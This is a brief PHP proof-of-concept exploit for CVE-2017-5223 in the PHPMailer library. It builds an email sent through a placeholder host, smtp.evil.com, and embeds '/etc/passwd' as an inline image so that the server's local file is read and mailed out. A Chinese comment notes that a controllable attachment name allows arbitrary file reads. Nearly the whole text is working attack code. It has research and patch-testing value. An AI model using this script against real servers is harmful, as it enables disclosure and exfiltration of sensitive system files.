# CVE-2017-5223
<?php  
#Author:Yxlink
require_once('PHPMailerAutoload.php');
$mail = new PHPMailer();
$mail->IsSMTP();
$mail->Host = "smtp.evil.com";
$mail->Port = 25;
$mail->SMTPAuth   = true;
 
$mail->CharSet  = "UTF-8";
$mail->Encoding = "base64";
 
$mail->Username = "test@evil.com";  
$mail->Password = "tes1234t";  
$mail->Subject = "hello";
 
$mail->From = "test@evil.com";  
$mail->FromName = "test";  
 
$address = "testtest@test.com";
$mail->AddAddress($address, "test");
 
$mail->AddAttachment('test.txt','test.txt');  //test.txt可控即可任意文件读取 
$mail->IsHTML(true);  
$msg="<img src='/etc/passwd'>test";//邮件内容形如这样写。
$mail->msgHTML($msg);
 
if(!$mail->Send()) {
  echo "Mailer Error: " . $mail->ErrorInfo;
} else {
  echo "Message sent!";
}
?>
